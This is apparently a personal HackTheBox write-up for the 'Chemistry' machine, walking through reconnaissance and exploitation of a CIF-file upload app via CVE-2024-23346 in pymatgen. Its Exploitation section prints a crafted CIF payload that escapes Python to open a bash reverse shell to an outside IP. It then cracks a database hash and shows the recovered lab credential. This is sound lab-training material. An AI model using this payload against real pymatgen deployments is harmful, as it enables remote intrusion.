---
title: Chemistry
tags:
  - HackTheBox
  - Easy
  - Linux
  - CIF
  - Brute-Forcing
date: 2024-12-26T00:00:00Z
---
![](Pasted%20image%2020241226135720.png)

## Reconnaissance

First, I added the new host to my known ones:

```shell
sudo echo "10.10.11.38 chemistry.htb" | sudo tee -a /etc/hosts
```

Then, I performed a Nmap scan:

```shell
nmap -sC -T4 -p- chemistry.htb > sC.txt

[redacted]
PORT     STATE SERVICE
22/tcp   open  ssh
| ssh-hostkey: 
|   3072 b6:fc:20:ae:9d:1d:45:1d:0b:ce:d9:d0:20:f2:6f:dc (RSA)
|   256 f1:ae:1c:3e:1d:ea:55:44:6c:2f:f2:56:8d:62:3c:2b (ECDSA)
|_  256 94:42:1b:78:f2:51:87:07:3e:97:26:c9:a2:5c:0a:26 (ED25519)
5000/tcp open  upnp
```

So I decided to check what's inside port `5000`:

![](Pasted%20image%2020241226140241.png)

Never heard about that xd. So I checked both endpoints `/login` and `/register`:

![](Pasted%20image%2020241226140325.png)

After login, I got this uploading content dashboard:

![](Pasted%20image%2020241226140343.png)

I uploaded the example provided to check functionality:

![](Pasted%20image%2020241226140645.png)

![](Pasted%20image%2020241226140700.png)

This is the content of the file:

```shell
cat example.cif 

data_Example
_cell_length_a    10.00000
_cell_length_b    10.00000
_cell_length_c    10.00000
_cell_angle_alpha 90.00000
_cell_angle_beta  90.00000
_cell_angle_gamma 90.00000
_symmetry_space_group_name_H-M 'P 1'
loop_
 _atom_site_label
 _atom_site_fract_x
 _atom_site_fract_y
 _atom_site_fract_z
 _atom_site_occupancy
 H 0.00000 0.00000 0.00000 1
 O 0.50000 0.50000 0.50000 1
```

## Weaponization

I searched for "*.cif vulnerabilities*" and found this blog at [ethicalhacking.uk](https://ethicalhacking.uk/cve-2024-23346-arbitrary-code-execution-in-pymatgen-via-insecure/#gsc.tab=0)

## Exploitation

I'll use the following PoC:

```cif
data_Example
_cell_length_a    10.00000
_cell_length_b    10.00000
_cell_length_c    10.00000
_cell_angle_alpha 90.00000
_cell_angle_beta  90.00000
_cell_angle_gamma 90.00000
_symmetry_space_group_name_H-M 'P 1'

loop_
 _atom_site_label
 _atom_site_fract_x
 _atom_site_fract_y
 _atom_site_fract_z
 _atom_site_occupancy
 
 H 0.00000 0.00000 0.00000 1
 O 0.50000 0.50000 0.50000 1

_space_group_magn.transform_BNS_Pp_abc  'a,b,[d for d in ().__class__.__mro__[1].__getattribute__ ( *[().__class__.__mro__[1]]+["__sub" + "classes__"]) () if d.__name__ == "BuiltinImporter"][0].load_module ("os").system ("/bin/bash -c \'sh -i >& /dev/tcp/10.10.14.28/666 0>&1\'");0,0,0'

_space_group_magn.number_BNS  62.448
_space_group_magn.name_BNS  "P  n'  m  a'  "
```

> Got reverse shell :D

![](Pasted%20image%2020241226142129.png)

## Lateral movement

Inspecting the machine I found `/home/app/instance/database.db`, which seems to be the database of the app:

![](Pasted%20image%2020241226142557.png)

I downloaded the database and opened it in an online viewer:

![](Pasted%20image%2020241226143047.png)

A lot of users are registered in the database, so I'll try to crack the hash of `rosa` using [CrackStation](https://crackstation.net/), as she is the other user in the machine:

![](Pasted%20image%2020241226143246.png)

> We've got creds: `rosa:unicorniosrosados` and also user flag :D

![](Pasted%20image%2020241226143406.png)

## Privilege Escalation

==I'll do this later :3==